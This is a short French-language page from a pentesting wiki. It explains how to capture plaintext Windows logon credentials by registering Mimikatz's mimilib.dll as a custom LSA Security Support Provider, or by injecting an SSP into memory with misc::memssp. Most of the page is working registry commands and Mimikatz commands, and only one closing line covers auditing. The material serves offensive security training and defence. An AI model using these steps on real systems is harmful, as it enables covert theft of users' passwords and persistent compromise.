# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Apprenez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **texte clair** les **identifiants** utilisés pour accéder à la machine.

#### Mimilib

Vous pouvez utiliser le binaire `mimilib.dll` fourni par Mimikatz. **Cela enregistrera dans un fichier tous les identifiants en texte clair.**\
Déposez le dll dans `C:\Windows\System32\`\
Obtenez une liste des packages de sécurité LSA existants :
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Ajoutez `mimilib.dll` à la liste des fournisseurs de support de sécurité (Security Packages) :
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Et après un redémarrage, toutes les informations d'identification peuvent être trouvées en texte clair dans `C:\Windows\System32\kiwissp.log`

#### En mémoire

Vous pouvez également injecter cela en mémoire directement en utilisant Mimikatz (notez que cela pourrait être un peu instable/ne pas fonctionner) :
```powershell
privilege::debug
misc::memssp
```
Cela ne survivra pas aux redémarrages.

#### Atténuation

ID d'événement 4657 - Audit de la création/changement de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
